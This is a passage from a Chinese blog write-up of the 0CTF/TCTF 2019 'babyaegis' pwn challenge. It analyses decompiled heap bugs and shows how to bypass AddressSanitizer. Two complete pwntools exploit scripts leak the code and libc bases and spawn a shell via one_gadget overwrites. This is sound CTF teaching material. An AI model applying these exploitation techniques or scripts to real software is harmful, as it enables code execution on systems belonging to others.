  unsigned __int64 v14; // [rsp+8h] [rbp-28h]
  signed int v15; // [rsp+10h] [rbp-20h]

  printf(&quot;Index: &quot;);
  v15 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6);
  if ( v15 &lt; 0 || v15 &gt;= 10 )
    goto LABEL_20;
  v7 = &amp;notes + 8 * v15;
  if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v7, a3);
  if ( !*v7 )
LABEL_20:
    error();
  v8 = &amp;notes + 8 * v15;
  if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v8, a3);
  v14 = *v8;
  if ( *((*v8 &gt;&gt; 3) + 0x7FFF8000LL) )
    _asan_report_load8(v14, a3);
  v9 = *v14;
  if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v14, a3);
  v10 = *v14;
  if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v14, a3);
  v11 = strlen(*v14) + v10 + 1;
  if ( *((v11 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v11, a3);
  v12 = *v11;
  printf(&quot;Content: %s\nID: %lu\n&quot;);
  return __readfsqword(0x28u);
}
</code></pre>
<p>根据输入的id，打印对应note的内容。</p>
<h5 id="delete-note"><a href="#delete-note" class="headerlink" title="delete note"></a>delete note</h5><pre><code class="c">unsigned __int64 __usercall delete_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rdi
  unsigned __int64 v9; // rdi
  unsigned __int64 v10; // rdi
  signed int v12; // [rsp+14h] [rbp-Ch]

  printf(&quot;Index: &quot;);
  v12 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6);
  if ( v12 &lt; 0 || v12 &gt;= 10 )
    goto LABEL_16;
  v7 = &amp;notes + 8 * v12;
  if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v7, a3);
  if ( !*v7 )
LABEL_16:
    error();
  v8 = &amp;notes + 8 * v12;
  if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v8, a3);
  v9 = *v8;
  if ( *((v9 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v9, a3);
  free(*v9);
  v10 = &amp;notes + 8 * v12;
  if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v10, a3);
  free(*v10);
  puts(&quot;Delete success!&quot;);
  return __readfsqword(0x28u);
}
</code></pre>
<p>删除note，并将对应的chunk释放掉，但是这里没有将指针清空，所以存在UAF。但是因为ASAN机制，所以利用不了，会报错，见下图。</p>
<p><img src="/picture/1554024652827.png" srcset="/img/loading.gif" alt="1554024652827"></p>
<h5 id="update-note"><a href="#update-note" class="headerlink" title="update note"></a>update note</h5><pre><code class="c">unsigned __int64 __usercall update_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rdi
  __int64 v9; // rbx
  unsigned __int64 v10; // rsi
  __int64 v11; // rax
  unsigned __int64 v12; // rdi
  __asan *v13; // rdi
  void (__fastcall *v14)(_QWORD, unsigned __int64); // rbx
  unsigned __int64 v16; // [rsp+8h] [rbp-28h]
  int v17; // [rsp+18h] [rbp-18h]
  signed int v18; // [rsp+1Ch] [rbp-14h]

  printf(&quot;Index: &quot;);
  v18 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6);
  if ( v18 &lt; 0 || v18 &gt;= 10 )
    goto LABEL_29;
  v7 = &amp;notes + 8 * v18;
  if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v7, a3);
  if ( !*v7 )
LABEL_29:
    error();
  v8 = &amp;notes + 8 * v18;
  if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v8, a3);
  v16 = *v8;
  printf(&quot;New Content: &quot;);
  if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v16, a3);
  v9 = *v16;
  if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v16, a3);
  v10 = strlen(*v16) + 1;
  v17 = read_until_nl_or_max(v9, v10);//overflow
  printf(&quot;New ID: &quot;);
  v11 = read_ul();
  if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) )
    v11 = _asan_report_load8(v16, a3);
  v12 = v17 + *v16;
  if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) )
    v11 = _asan_report_store8(v12);
  *v12 = v11;
  v13 = (v16 + 8);
  if ( *(((v16 + 8) &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v13, a3);
  v14 = *v13;
  if ( *v13 != cfi_check )
  {
    _asan_handle_no_return(v13);
    _ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v14);
  }
  v14(v18, v10);
  puts(&quot;Update success!&quot;);
  if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v16, a3);
  if ( *v16 &gt;&gt; 44 != 6LL )
    error();
  return __readfsqword(0x28u);
}
</code></pre>
<p>更新note的content和id。这里存在一个漏洞。在<code>read_until_nl_or_max</code>函数那里，它默认最后一位为null，但是如果我们读入max大小的字符串，那么content的内容就会和ID相连，<code>strlen(*v16) + 1</code>的值就会比content真正的长度大，会造成溢出。 但是因为asan的check机制，会报错并且退出。</p>
<h5 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h5><pre><code class="c">unsigned __int64 secret()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-10h]

  if ( secret_enable )
  {
    printf(&quot;Lucky Number: &quot;);
    v2 = read_ul();
    if ( v2 &gt;&gt; 44 )
      v0 = (v2 | 0x700000000000LL);
    else
      v0 = v2;
    *v0 = 0;
    secret_enable = 0;
  }
  else
  {
    puts(&quot;No secret!&quot;);
  }
  return __readfsqword(0x28u);
}
</code></pre>
<p>这里读取一个地址，然后判断这个地址右移44位是否大于0，如果大于的话就将这个地址与x700000000000LL 进行或运算，然后往这个地址写入一个0。</p>
<h4 id="AddressSanitizer的映射机制"><a href="#AddressSanitizer的映射机制" class="headerlink" title="AddressSanitizer的映射机制"></a>AddressSanitizer的映射机制</h4><p>调试一下，感受一下AddressSanitizer机制</p>
<p>分配一个0x10大小的note_0 </p>
<p>通过vmmap命令查看内存布局</p>
<p><img src="/picture/1554031260551.png" srcset="/img/loading.gif" alt="1554031260551"></p>
<p>其中0x10大小的chunk分配的起始地址在0x602000000010</p>
<pre><code>pwndbg&gt; x/10gx 0x602000000000
0x602000000000:    0x02ffffff00000002    0x6d00000120000010        ==&gt; chunk header
0x602000000010:    0x0061616161616161    0xbe00000000000000
0x602000000020:    0x02ffffff00000002    0x7180000120000010        ==&gt; chunk header
0x602000000030:    0x0000602000000010    0x000055ffd5a95ab0
0x602000000040:    0x02ffffff00000002    0x6d00000120000010
</code></pre><p>通过 shadow  = addr &gt;&gt;3 + 0x7FFF8000 计算出chunk对应的shadow地址,然后去查看。这里使用中的chunk对应的Redzone的值为0，而fa代表 heap left redzone。这可以通过报错信息获得。</p>
<pre><code>pwndbg&gt; x/10gx 0xc047fff8000
0xc047fff8000:    0x0000fafa0000fafa    0x0000fafa0000fafa
0xc047fff8010:    0x0000fafa0000fafa    0xfafafafafafafafa
0xc047fff8020:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8030:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8040:    0xfafafafafafafafa    0xfafafafafafafafa
</code></pre><p>将note_0 delete掉，此时对应的shadow  redzone 被置为0xfd，表示free heap region。</p>
<pre><code>pwndbg&gt; x/10gx 0xc047fff8000
0xc047fff8000:    0xfdfdfafafdfdfafa    0xfafafafafafafafa
0xc047fff8010:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8020:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8030:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8040:    0xfafafafafafafafa    0xfafafafafafafafa
</code></pre><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p><strong>利用secret功能来实现update溢出</strong></p>
<p>asan会对shadow memory进行检查，只要我们将下一个chunk的heap left redzone的值修改为0，那么溢出到下一个chunk就不会报错了。</p>
<p>shadow memory = 0x602000000020&gt;&gt;3 + 0x7fff8000 = 0xc047fff8004</p>
<p>通过secret修改下一个chunk的redzone</p>
<pre><code>pwndbg&gt; x/10gx 0xc047fff8004
0xc047fff8004:    0xfafafafa0000fa00    0xfafafafafafafafa
0xc047fff8014:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8024:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8034:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8044:    0xfafafafafafafafa    0xfafafafafafafafa
</code></pre><p><strong>泄露地址</strong></p>
<p>改写redzone后，可以通过溢出修改下一个chunk的 chunk header。</p>
<p>结构体再看一波</p>
<pre><code class="c">struct ChunkHeader {
  // 1-st 8 bytes.
  u32 chunk_state       : 8;  // Must be first.
  u32 alloc_tid         : 24;

  u32 free_tid          : 24;
  u32 from_memalign     : 1;
  u32 alloc_type        : 2;
  u32 rz_log            : 3;
  u32 lsan_tag          : 2;
  // 2-nd 8 bytes
  // This field is used for small sizes. For large sizes it is equal to
  // SizeClassMap::kMaxSize and the actual size is stored in the
  // SecondaryAllocator&#39;s metadata.
  u32 user_requested_size : 29;
  // align &lt; 8 -&gt; 0
  // else      -&gt; log2(min(align, 512)) - 2
  u32 user_requested_alignment_log : 3;
  u32 alloc_context_id;
};
</code></pre>
<p><code>ChunkHeader</code>前8bit存了chunk_state ，后24bit存了 alloc_tid ，以此类推。可以发现<code>ChunkHeader</code>中存有</p>
<p><code>user_requested_size</code>字段，尝试修改这个字段，可以发现如果将这修改为一个很大的值的话，释放掉chunk就会使 shadow memory 回到初始状态，具体的机制我没看源码了解的就不是很多，看别人的writeup说是内存过大，触发了asan的回收机制。</p>
<pre><code>pwndbg&gt; x/10gx 0xc047fff8000
0xc047fff8000:    0xfafafa00fafafafa    0xfafafafafafafafa
0xc047fff8010:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8020:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8030:    0xfafafafafafafafa    0xfafafafafafafafa
0xc047fff8040:    0xfafafafafafafafa    0xfafafafafafafafa
</code></pre><p>这时再新建一个note，会发现新分配的note和之前分配的note重叠，并且顺序是相反的。所以我们可以控制note中的内存指针，从而实现任意读写，利用这个先泄露出code_base， 然后泄露got表内容获取libc地址。</p>
<p>此时note和堆的情况</p>
<pre><code>pwndbg&gt; x/10gx 0x5633cc75fcc0
0x5633cc75fcc0 &lt;notes&gt;:    0x0000602000000030    0x0000602000000010
0x5633cc75fcd0 &lt;notes+16&gt;:    0x0000000000000000    0x0000000000000000
0x5633cc75fce0 &lt;notes+32&gt;:    0x0000000000000000    0x0000000000000000
0x5633cc75fcf0 &lt;notes+48&gt;:    0x0000000000000000    0x0000000000000000
0x5633cc75fd00 &lt;notes+64&gt;:    0x0000000000000000    0x0000000000000000
pwndbg&gt; x/10gx 0x0000602000000000
0x602000000000:    0x02ffffff00000002    0x4d00000120000010
0x602000000010:    0x0000602000000030    0x00005633cb8c3ab0
0x602000000020:    0x02ffffff00000002    0x3080000120000010
0x602000000030:    0x0000602000000018    0xbe00000000000000
0x602000000040:    0x0000000000000000    0x0000000000000000
</code></pre><p><strong>getshell</strong></p>
<p>两种思路，一种是改写<code>_ZN11__sanitizerL15UserDieCallbackE</code>为one_gadeget ，另一种是改写update中的<code>read_until_nl_or_max</code>函数的返回地址。通过libc中的 <code>__enviorn</code>变量，泄露出栈地址，然后将<code>read_until_nl_or_max</code>函数的返回地址改为one_gadget。</p>
<h6 id="改写call-back为one-gadget"><a href="#改写call-back为one-gadget" class="headerlink" title="改写call_back为one_gadget"></a>改写call_back为one_gadget</h6><p>这里通过覆盖bss段上的<code>_ZN11__sanitizerL15UserDieCallbackE</code>为one_gadget，然后造成内存错误时就会被执行。这能成功的原因是<code>UserDieCallback</code>函数会调用在 bss段上的<code>_ZN11__sanitizerL15UserDieCallbackE</code>所指的函数。</p>
<p>调用链</p>
<pre><code class="c"> _asan_handle_no_return(v17, v10, v12, v16, v13, v14);
_ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v18, v19, v20, v21, v22);
 if ( __sanitizer::UserDieCallback )
    __sanitizer::UserDieCallback(this);
  v2 = &amp;__sanitizer::InternalDieCallbacks;
</code></pre>
<p> <code>__sanitizer::UserDieCallback(this)</code>会去调用bss段上的<code>_ZN11__sanitizerL15UserDieCallbackE</code>，所以只要将<code>_ZN11__sanitizerL15UserDieCallbackE</code>覆盖为one_gadget,触发内存错误时就可以getshell了。</p>
<p><img src="/picture/1554108358348.png" srcset="/img/loading.gif" alt="1554108358348"></p>
<h6 id="改写read-until-nl-or-max的返回地址"><a href="#改写read-until-nl-or-max的返回地址" class="headerlink" title="改写read_until_nl_or_max的返回地址"></a>改写read_until_nl_or_max的返回地址</h6><p>先泄露出stack的地址，泄露方法和之前的一样，然后将<code>read_until_nl_or_max</code>函数的返回地址修改为one_gadget，<code>read_until_nl_or_max</code>返回时就可以getshell了。</p>
<p>调试计算出<code>read_until_nl_or_max</code>的返回地址和泄露出来stack的地址之间的偏移</p>
<p><img src="/picture/1554112085365.png" srcset="/img/loading.gif" alt="1554112085365"></p>
<p>但是发现直接覆盖为one_gadget不行, 这里通过覆盖返回地址为gets函数，将栈的内容清空满足one_gadget的条件</p>
<p><img src="/picture/1554114849918.png" srcset="/img/loading.gif" alt="1554114849918"></p>
<h5 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h5><pre><code class="python">from pwn import*
context.log_level = &quot;debug&quot;

host = &#39;111.186.63.209&#39;
port = 6666

#p = process(&#39;./aegis&#39;)
p = remote(host,port)
elf = ELF(&#39;./aegis&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def add(idx,size,content):
    p.sendlineafter(&quot;Choice: &quot;,&#39;1&#39;)
    p.sendlineafter(&quot;:&quot;,str(size))
    p.sendafter(&quot;:&quot;,content)
    p.sendlineafter(&quot;:&quot;,str(idx))

def show(idx):
    p.sendlineafter(&quot;:&quot;,&#39;2&#39;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def update(idx,content,new_idx):
    p.sendlineafter(&quot;:&quot;,&#39;3&#39;)
    p.sendlineafter(&quot;: &quot;,str(idx))
    p.sendafter(&quot;:&quot;,content)
    p.sendlineafter(&quot;:&quot;,str(new_idx))


def delete(idx):
    p.sendlineafter(&quot;:&quot;,&#39;4&#39;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def secret(add):
    p.sendlineafter(&quot;:&quot;,&#39;666&#39;)
    p.sendlineafter(&quot;:&quot;,str(add))

def get_base():
    text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[4], 16)
    print hex(text_base)
    return text_base

#note_add = get_base() + 0xFB0CC0
#d = 0x113954 +get_base() 
#gdb.attach(p,&#39;b *{}&#39;.format(hex(d)))
#success(hex(note_add))

add(0x123456789abcdef,0x10,&#39;a&#39;*0x8)
secret(str(0xc047fff8004))

update(0,&#39;a&#39;*0x12,0x123456789)
update(0,&#39;a&#39;*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff)

delete(0)

add(0,0x10,p64(0x602000000018))
show(0)
p.recvuntil(&quot;Content: &quot;)
leak_code = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
code_base = leak_code - 0x114ab0
success(hex(code_base))

puts_got = elf.got[&#39;puts&#39;]
update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libc
show(0)
p.recvuntil(&quot;Content: &quot;)
leak_libc = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
libc_base = leak_libc - libc.symbols[&#39;puts&#39;]
libc.address = libc_base
success(hex(libc_base))

one_gadget = libc_base+0x10a38c
call_back = code_base + 0xFB0888
update(1,p64(call_back)[:7],0) # overwrite cfg ==&gt; null ,trigger memory error
pause()
update(0,&#39; &#39;*8,one_gadget)  #overwrite call_back ==&gt; one_gadget

p.interactive(&quot;zs0zrc&gt;&gt;&quot;)
</code></pre>
<h5 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h5><pre><code class="python">from pwn import*
context.log_level = &quot;debug&quot;

host = &#39;111.186.63.209&#39;
port = 6666

#p = process(&#39;./aegis&#39;)
p = remote(host,port)
elf = ELF(&#39;./aegis&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def add(idx,size,content):
    p.sendlineafter(&quot;Choice: &quot;,&#39;1&#39;)
    p.sendlineafter(&quot;:&quot;,str(size))
    p.sendafter(&quot;:&quot;,content)
    p.sendlineafter(&quot;:&quot;,str(idx))

def show(idx):
    p.sendlineafter(&quot;:&quot;,&#39;2&#39;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def update(idx,content,new_idx):
    p.sendlineafter(&quot;:&quot;,&#39;3&#39;)
    p.sendlineafter(&quot;: &quot;,str(idx))
    p.sendafter(&quot;:&quot;,content)
    p.sendlineafter(&quot;:&quot;,str(new_idx))


def delete(idx):
    p.sendlineafter(&quot;:&quot;,&#39;4&#39;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def secret(add):
    p.sendlineafter(&quot;:&quot;,&#39;666&#39;)
    p.sendlineafter(&quot;:&quot;,str(add))

def get_base():
    text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[4], 16)
    print hex(text_base)
    return text_base
&#39;&#39;&#39;
ru_add1 = 0x1146E0 + get_base()
ru_add2 = 0x1140D0 + get_base()
note_add = get_base() + 0xFB0CC0
success(hex(note_add))
&#39;&#39;&#39;
add(0x123456789abcdef,0x10,&#39;a&#39;*0x8)
secret(str(0xc047fff8004))

update(0,&#39;a&#39;*0x12,0x123456789)
update(0,&#39;a&#39;*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff)
delete(0)

add(0,0x10,p64(0x602000000018))
show(0)
p.recvuntil(&quot;Content: &quot;)
leak_code = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
code_base = leak_code - 0x114ab0
success(hex(code_base))

puts_got = elf.got[&#39;puts&#39;]
update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libc
show(0)
p.recvuntil(&quot;Content: &quot;)
leak_libc = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
libc_base = leak_libc - libc.symbols[&#39;puts&#39;]
libc.address = libc_base
success(hex(libc_base))

one_gadget = libc_base+0x10a38c
call_back = code_base + 0xFB0888

update(1,p64(libc.symbols[&#39;__environ&#39;])[:7],0) 
show(0)
p.recvuntil(&quot;Content: &quot;)
stack_add = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
success(hex(stack_add))
ret = stack_add - 0x150

update(1,p64(ret)[:7],0)
sleep(0.1)
p.sendline(&quot;3&quot;)
sleep(0.1)
p.sendline(&#39;0&#39;)
sleep(0.1)
p.send(p64(libc.symbols[&#39;gets&#39;])[:7])# overwrite ret ==&gt; gets
p.sendline(&#39;a&#39;*0x2 + p64(one_gadget) + &#39;\x00&#39;*0x100)#rop and clear stack

p.interactive(&quot;zs0zrc&gt;&gt;&quot;)

</code></pre>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这道题最主要的难点在于ASAN这个防护，要想办法去绕过它。还有就是要静下心来调试，通过这道题学了很多新东西，很赞的一道题。</p>
<p><strong>Reference</strong></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/175401" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175401</a></li>
<li><a href="https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP</a></li>
<li><p><a href="http://lordofpwn.kr/index.php/2019/03/28/0ctf-2019-zerotask-writeup/" target="_blank" rel="noopener">http://lordofpwn.kr/index.php/2019/03/28/0ctf-2019-zerotask-writeup/</a></p>
</li>
<li><p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#babyaegis" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#babyaegis</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/175556#h2-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175556#h2-8</a></p>
</li>
<li><p><a href="https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP</a></p>
</li>
<li><p><a href="https://github.com/scwuaptx/CTF/blob/master/2019-writeup/0ctf/babyaegis.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2019-writeup/0ctf/babyaegis.py</a></p>
</li>
</ul>

            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF-s-writeup/">CTF&#39;s writeup</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <script defer src="https://utteranc.es/client.js" repo="zszcr/comment" issue-term="pathname" label="utterances" theme="github-light" crossorigin="anonymous" async>
  </script>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var post = $('#post');
      var toc = $('#toc');
      var tocLimMax = post.offset().top + post.height() - navHeight;

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = $('#board-ctn').css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->


  

  
    <!-- Google Analytics -->
    <script defer>
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-160202176-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "0CTF/TCTF2019 PWN 复现&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
